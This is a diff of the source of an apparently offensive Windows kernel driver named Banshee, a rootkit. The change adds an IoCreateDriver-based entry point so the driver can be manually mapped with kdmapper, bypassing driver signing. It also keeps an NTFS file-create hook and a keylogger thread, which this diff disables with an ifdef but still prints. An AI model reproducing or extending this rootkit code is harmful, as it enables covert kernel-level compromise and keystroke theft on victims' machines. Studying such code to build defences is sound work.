@@ -151,18 +151,16 @@ BeCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
 }
 
 /**
- * Driver entrypoint (think main()).
+ * Banshees driver entrypoint.
  *
  * @param pDriverObject Pointer to the DriverObject.
  * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
  * @return NTSTATUS status code.
  */
-extern "C"
 NTSTATUS
-DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
+BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
     UNREFERENCED_PARAMETER(pRegistryPath);
-    LOG_MSG("DriverEntry Called \r\n");
 
     NTSTATUS NtStatus = STATUS_SUCCESS;
     PDEVICE_OBJECT pDeviceObject = NULL;
@@ -170,14 +168,20 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = IoCreateDevice(
         pDriverObject,
         0,
-        &usDriverName,
+        &usDeviceName,
         FILE_DEVICE_UNKNOWN, // not associated with any real device
         FILE_DEVICE_SECURE_OPEN,
-        FALSE, 
+        FALSE,
         &pDeviceObject
     );
 
     if (pDeviceObject == NULL)
+    {
+        return NtStatus;
+    }
+
+    NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDeviceName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
+    if (NtStatus != 0)
     {
         return NtStatus;
     }
@@ -192,14 +196,8 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     pDriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)BeClose;               // CloseHandle
     pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
     pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl
-    
-    NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
-    if (NtStatus != 0)
-    {
-        return NtStatus;
-    }
 
-    NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
+    NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
     if (NtStatus != 0)
     {
         return NtStatus;
@@ -209,6 +207,7 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = BeHookNTFSFileCreate();
 #endif
 
+#ifdef notdefined
     // Start Keylogger Thread
     PKTHREAD ThreadObject;
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
@@ -217,8 +216,41 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
         return NtStatus;
     }
 
+#endif
+
     pDeviceObject->Flags |= DO_BUFFERED_IO;
     pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; // finished initializing
 
     return NtStatus;
+}
+
+/**
+ * Driver entrypoint.
+ *
+ * @param pDriverObject Pointer to the DriverObject.
+ * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
+ * @return NTSTATUS status code.
+ */
+extern "C"
+NTSTATUS
+DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
+{
+    LOG_MSG("DriverEntry Called \r\n");
+
+    // If mapped, e.g. with kdmapper, those are empty.
+    UNREFERENCED_PARAMETER(pDriverObject);
+    UNREFERENCED_PARAMETER(pRegistryPath);
+
+    UNICODE_STRING createDriverRoutine = RTL_CONSTANT_STRING(L"IoCreateDriver"); // this sucks, but is needed for now, since we still use IOCTL to communicate
+    IOCREATEDRIVER IoCreateDriver = (IOCREATEDRIVER)MmGetSystemRoutineAddress(&createDriverRoutine);
+    
+    NTSTATUS status = IoCreateDriver(&usDriverName, &BansheeEntry);
+
+    if (NT_SUCCESS(status))
+    {
+        LOG_MSG("BansheeEntry Called \r\n");
+        return BansheeEntry(pDriverObject, pRegistryPath);
+    }
+
+    return status;
 }
